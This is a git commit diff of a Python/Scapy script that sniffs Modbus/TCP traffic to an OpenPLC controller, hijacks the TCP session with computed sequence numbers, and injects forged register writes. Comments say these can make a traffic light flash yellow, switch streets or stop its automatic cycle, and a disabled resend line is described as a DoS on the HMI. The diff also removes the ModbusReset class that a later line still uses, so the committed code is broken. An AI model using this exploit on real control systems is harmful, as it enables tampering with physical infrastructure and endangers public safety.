4e13651dea90857a253978bef10905dc2ad9d64e
Ty Minton <57763028+Tyroneous@users.noreply.github.com>
2022-03-19 19:39:48 -0400

    Final Changes

--- packetcrafter.py
+++ packetcrafter.py
@@ -1,16 +1,14 @@
 from scapy.all import *
 
-vic_ip = '172.16.192.10' #this is actually the host machine but I needed the TCP values somehow...
-
 flag = 1
 while flag:
 	OPENPLC_FRAMES = sniff(iface='eth0', count=5, filter = 'dst host 172.16.192.10')
-	READ_REGISTER_QUERY = OPENPLC_FRAMES[2] #change from 2 to 0
-	READ_REGISTER_ACK = OPENPLC_FRAMES[4] #changed from 3 to 1
+	READ_REGISTER_QUERY = OPENPLC_FRAMES[2] 
+	READ_REGISTER_ACK = OPENPLC_FRAMES[4] 
 
 	try:
-		if "\x00\x01\x00\x00\x00\r\x01\x03\n" in READ_REGISTER_QUERY[Raw].load:
-			print("END OF COMMUNICATION LOOP (FINAL QUERY) DETECTED")
+		if "\x00\x01\x00\x00\x00\r\x01\x03\n" in READ_REGISTER_QUERY[Raw].load:  #this string should be customized to scan for the raw header of the 
+			print("END OF COMMUNICATION LOOP (FINAL QUERY) DETECTED")	 #penultimate message in the communication sequence
 			flag=0
 	except:
 		flag=1
@@ -21,8 +19,8 @@ tcpdata = {
 	'dst': READ_REGISTER_ACK[IP].dst,
 	'sport': READ_REGISTER_ACK[TCP].sport,
 	'dport': READ_REGISTER_ACK[TCP].dport,
-	'seq': READ_REGISTER_ACK[TCP].seq + 21,
-	'ack': READ_REGISTER_ACK[TCP].ack + 12,
+	'seq': READ_REGISTER_ACK[TCP].seq + 21, #these numbers aree subject to change, based off the offset within the communication with a known length of
+	'ack': READ_REGISTER_ACK[TCP].ack + 12,	#the previous packet sent within the TCP stream
 	'wnd': READ_REGISTER_ACK[TCP].window
 	}
 
@@ -32,7 +30,7 @@ payload = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
 
 class ModbusTCP(Packet):
 	name = "ModbusTcp"
-	fields_desc = [ ShortField("Transaction Identifier", 1337),
+	fields_desc = [ ShortField("Transaction Identifier", 1337), # Transaction ID is customized to show direct results, other variables are known goods
 			ShortField("Protocol Identifier", 0),
 			ShortField("Length", 6),
 			ByteField("Unit Identifier", 1)
@@ -40,17 +38,10 @@ class ModbusTCP(Packet):
 
 class ModbusSet(Packet):
 	name = "Modbus"
-	fields_desc = [ XByteField("Function Code", 6),
-			ShortField("Reference Number", 1),
+	fields_desc = [ XByteField("Function Code", 6), #REQUIRED TO WRITE TO SINGLE REGISTER, SEE FUNCTION CODES FOR MORE INFORMATION
+			ShortField("Reference Number", 1), #Customizable to create different results (Flashing yellow, change from side to main street, disable auto sequence, etc.)
 			ShortField("Data", 1)
 			]
-
-class ModbusReset(Packet):
-        name = "Modbus"
-        fields_desc = [ XByteField("Function Code", 6),
-                        ShortField("Reference Number", 0),
-                        ShortField("Data", 0)
-                        ]
 
 
 payload = payload/ModbusTCP()/ModbusSet()
@@ -62,4 +53,4 @@ print("AND THAT\'S ALL FOLKS")
 payload.display()
 
 resetPayload = payload/ModbusTCP()/ModbusReset()
-# testing resetting the register send(resetPayload, verbose=0, iface='eth0')
+#send(resetPayload, verbose=0, iface='eth0') this should not be uncommented, but kept in final beta to introduce the idea of a DoS attack on the HMI
